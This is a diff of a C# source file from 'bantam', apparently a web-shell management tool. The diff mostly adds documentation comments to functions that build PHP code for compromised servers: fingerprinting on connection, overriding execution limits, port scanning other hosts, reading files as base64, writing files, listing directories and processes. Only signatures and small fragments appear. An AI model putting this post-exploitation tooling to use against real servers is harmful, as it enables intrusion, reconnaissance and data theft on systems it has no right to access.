@@ -9,7 +9,7 @@ namespace bantam.Classes
         /// <summary>
         /// 
         /// </summary>
-        public const  string rowSeperator = "|=$=|";
+        public const string rowSeperator = "|=$=|";
 
         /// <summary>
         /// 
@@ -48,8 +48,8 @@ namespace bantam.Classes
         public const string windowsOS_Ver           = "ver";
         public const string posixOS_Whoami          = "whoami";
 
-        public static string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
-        public static string phpOb_End = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();
+        public static readonly string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
+        public static readonly string phpOb_End = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();
 
         /// <summary>
         /// 
@@ -113,7 +113,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Overrides PHP max_execution_time setting, to prevent execution timeouts
         /// </summary>
         /// <returns></returns>
         public static string MaxExecutionTime()
@@ -122,7 +122,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// OpenSSL AES-256-CBC encryption implementation
         /// </summary>
         /// <param name="varName"></param>
         /// <param name="encryptionKey"></param>
@@ -135,7 +135,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Mcrypt AES-256-CBC encryption implementation
         /// </summary>
         /// <param name="varName"></param>
         /// <param name="encryptionKey"></param>
@@ -187,7 +187,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// This is the initial php code that is ran on every client on connection startup to gather a bit of information about them
         /// </summary>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
@@ -309,9 +309,9 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Scans the remote "host" for open ports
         /// </summary>
-        /// <param name="host"></param>
+        /// <param name="host">The target to portscan</param>
         /// <returns></returns>
         public static string PortScanner(string host, string portsCode, bool encryptResponse)
         {
@@ -440,7 +440,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// phpinfo(); page
         /// </summary>
         /// <param name="code"></param>
         /// <param name="encryptResponse"></param>
@@ -457,7 +457,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// echo's 1 as a test
         /// </summary>
         /// <param name="encryptReponse"></param>
         /// <returns></returns>
@@ -471,7 +471,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Windows function for getting HDD letters for the filebrowser
         /// </summary>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
@@ -503,9 +503,9 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Gets base64 encoded file contents from the specified "fileName" variable
         /// </summary>
-        /// <param name="fileName"></param>
+        /// <param name="fileName">This expects a php variable that contains the path</param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
         public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
@@ -518,9 +518,9 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Gets base64 encoded file contents from the specified "fileName" variable
         /// </summary>
-        /// <param name="fileName"></param>
+        /// <param name="fileName">This expects the direct path string to the file</param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
         public static string ReadFileToBase64(string fileName, bool encryptResponse)
@@ -533,9 +533,9 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Writes a file to the server at the specified "remoteFileLocation" location.
         /// </summary>
-        /// <param name="remoteFileLocation"></param>
+        /// <param name="remoteFileLocation">This expects the direct path string to the file you want to create</param>
         /// <param name="b64FileContents"></param>
         /// <returns></returns>
         public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
@@ -544,10 +544,10 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Writes a file to the server at the specified "remoteFileLocation" location.
         /// </summary>
         /// <param name="remoteFileLocation"></param>
-        /// <param name="b64FileContents"></param>
+        /// <param name="b64FileContents">This expects a php variable that contains the path</param>
         /// <returns></returns>
         public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
         {
@@ -555,7 +555,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Returns the directory contents of a specified directory/path
         /// </summary>
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
@@ -596,7 +596,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Returns the appropriate console command for getting running process
         /// </summary>
         /// <param name="windowsOS"></param>
         /// <returns></returns>
